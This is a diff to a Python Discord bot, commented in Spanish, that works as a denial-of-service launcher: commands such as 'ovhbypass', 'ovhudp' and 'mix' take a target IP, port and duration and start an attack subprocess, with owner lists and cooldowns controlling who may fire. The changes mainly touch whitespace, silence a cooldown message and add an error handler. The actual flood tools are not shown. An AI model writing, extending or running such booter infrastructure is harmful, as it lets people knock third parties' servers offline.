@@ -10,7 +10,7 @@ TOKEN = os.getenv('KEYS')
 # CHANNEL ID (¡PON EL ID DEL CANAL AQUÍ!)
 CHANNEL_ID = 1459317728824397977
 
-# Imprimir información de configuración (con mejor formato)
+# Imprimir información de configuración de configuración (con mejor formato)
 print("\n" + "="*60)
 print("🔍 CONFIGURANDO BOT")
 print("="*60)
@@ -22,8 +22,8 @@ if TOKEN:
     print(f"🔐 Vista previa: {TOKEN[:15]}...")
 
     if token_length < 50:
-        print("⚠️  Advertencia: Token muy corto ({token_length} chars)")
-        print("   Un token válido de Discord tiene ~59 caracteres")
+        print("⚠️ Advertencia: Token muy corto ({token_length} chars)")
+        print(" Un token válido de Discord tiene ~59 caracteres")
 else:
     print("❌ ERROR CRÍTICO: No se encontró el token")
     print("")
@@ -32,8 +32,8 @@ else:
     print("2. En local: Exporta variable de entorno: export KEYS='tu_token'")
     print("")
     print("Pasos en GitHub Actions:")
-    print("   Settings → Secrets and variables → Actions")
-    print("   New repository secret → Name: KEYS → Value: [tu_token]")
+    print(" Settings → Secrets and variables → Actions")
+    print(" New repository secret → Name: KEYS → Value: [tu_token]")
     print("")
     exit(1)
 
@@ -46,7 +46,7 @@ intents.message_content = True
 bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents)
 
 # Lista de Owners (reemplaza con los IDs de tus usuarios)
-OWNER_IDS = [1422676828161703956]  # Ejemplo: [1234567890, 9876543210]
+OWNER_IDS = [1422676828161703956] # Ejemplo: [1234567890, 9876543210]
 
 # Diccionario para rastrear los cooldowns por usuario
 cooldowns = {}
@@ -76,8 +76,8 @@ async def check_channel(ctx):
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandNotFound):
-        return  # Ignorar el error de comando no encontrado
-    raise error  # Re-lanzar otros errores
+        return # Ignorar el error de comando no encontrado
+    raise error # Re-lanzar otros errores
 
 # Función para ejecutar un ataque (ahora con control de errores y mensajes)
 async def ejecutar_ataque(comando: str, ctx, ip: str, port: int, tiempo: int, metodo: str):
@@ -92,12 +92,12 @@ async def ejecutar_ataque(comando: str, ctx, ip: str, port: int, tiempo: int, me
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
-        await proceso_en_curso.wait()  # Esperar a que el proceso termine
+        await proceso_en_curso.wait() # Esperar a que el proceso termine
 
         stdout, stderr = await proceso_en_curso.communicate()
 
         print(f"Attack method '{comando}' finished")
-        await enviar_mensaje_con_formato(ctx, "Ataque Finalizado", f"Attack {metodo.upper()} {ip}:{port} finished", discord.Color.green())  # Mensaje de finalización
+        await enviar_mensaje_con_formato(ctx, "Ataque Finalizado", f"Attack {metodo.upper()} {ip}:{port} finished", discord.Color.green()) # Mensaje de finalización
     except Exception as e:
         print(f"Error al ejecutar el ataque: {e}")
         try:
@@ -137,7 +137,7 @@ async def ovhbypass_command(ctx, ip: str = None, port: str = None, tiempo: str =
 @bot.command(name='mix')
 async def mix_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
     await realizar_ataque(ctx, 'mix', ip, port, tiempo)
-    
+
 @bot.command(name='ovhudp')
 async def ovhudp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
     await realizar_ataque(ctx, 'ovhudp', ip, port, tiempo)
@@ -180,7 +180,7 @@ async def realizar_ataque(ctx, metodo: str, ip: str, port: str, tiempo: str):
 
     # 2. Cooldown y ataque en curso
     if user_id in cooldowns and cooldowns[user_id] > asyncio.get_event_loop().time():
-        tiempo_restante = cooldowns[user_id] - asyncio.get_event_loop().time()
+        #Comentar Mensaje Cooldown
         #await enviar_mensaje_con_formato(ctx, "Cooldown", f"Debes esperar {tiempo_restante:.2f} segundos para volver a atacar", discord.Color.orange())
         return
 
@@ -238,9 +238,16 @@ async def show_methods(ctx):
     embed.set_footer(text=f"Solicitado por {ctx.author.name}#{ctx.author.discriminator}", icon_url=ctx.author.avatar.url)
     await ctx.send(embed=embed)
 
+# Manejo de errores global
+@bot.event
+async def on_error(event, *args, **kwargs):
+    print(f"Error en evento: {event}")
+    print(f"Args: {args}")
+    print(f"Kwargs: {kwargs}")
+
 # Iniciar el bot
 print("🚀 INICIANDO BOT CON TODOS LOS MÉTODOS")
-print("🔧 Configurado para leer directamente de secret 'KEYS'")
+print(" Configurado para leer directamente de secret 'KEYS'")
 print(f"📏 Token verificado: {len(TOKEN)} caracteres")
 
 try:
